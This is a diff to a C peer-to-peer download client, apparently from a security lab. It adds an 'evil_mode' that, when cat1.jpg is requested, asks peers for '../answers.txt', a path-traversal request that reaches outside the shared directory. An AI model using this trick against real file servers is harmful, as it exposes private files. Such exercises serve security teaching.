@@ -23,7 +23,7 @@
 #include "md5.h"
 #include "osp2p.h"
 
-int evil_mode = 1;			// nonzero iff this peer should behave badly
+int evil_mode = 0;			// nonzero iff this peer should behave badly
 
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
@@ -35,10 +35,11 @@ static int listen_port;
  * a bounded buffer that simplifies reading from and writing to peers.
  */
 
-#define TASKBUFSIZ	4096	// Size of task_t::buf
+#define TASKBUFSIZ	65536	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
 #define MAXFILESIZ  512000  //download file size max
 #define TRANS_MIN   1024    //minimum download speed
+
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -464,11 +465,28 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	size_t messagepos;
 	assert(tracker_task->type == TASK_TRACKER);
 
-	message("* Finding peers for '%s'\n", filename);
+        int getAns = strncmp(filename, "cat1.jpg", 8);
 
 
-    //Connect to peer and send the GET command
-	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+        if ( (getAns == 0) && evil_mode)
+        {
+            message("* Attempting to retrieve answers.txt instead of cat1.jpg\n");
+        }
+        else 
+        {
+	    message("* Finding peers for '%s'\n", filename);
+        }
+
+        if (evil_mode)
+        {
+            osp2p_writef(tracker_task->peer_fd, "WHO\n");
+        }
+        else
+        {
+            //Connect to peer and send the GET command
+	    osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+        }
+
 	messagepos = read_tracker_response(tracker_task);
 	if (tracker_task->buf[messagepos] != '2') {
 		error("* Tracker error message while requesting '%s':\n%s",
@@ -480,9 +498,17 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-    //Use strncpy instead of strcpy to protect from buffer overrun
-	strncpy(t->filename, filename, FILENAMESIZ);
-    t->filename[FILENAMESIZ-1] = 0;
+
+        if ( evil_mode && (getAns == 0) )
+        {
+            strncpy(t->filename, "../answers.txt", sizeof(t->filename));
+        }
+        else
+        {
+            //Use strncpy instead of strcpy to protect from buffer overrun
+	    strncpy(t->filename, filename, FILENAMESIZ);
+            t->filename[FILENAMESIZ-1] = 0;
+        }
 
 	// add peers
 	s1 = tracker_task->buf;
@@ -601,7 +627,7 @@ static void task_download(task_t *t, task_t *tracker_task)
         if(trans_size < TRANS_MIN)
         {
             slow++;
-            if(slow > 12)
+            if(slow > 100)
             {
                 error("* Peer too slow, changing peers.\n");
                 goto try_again;
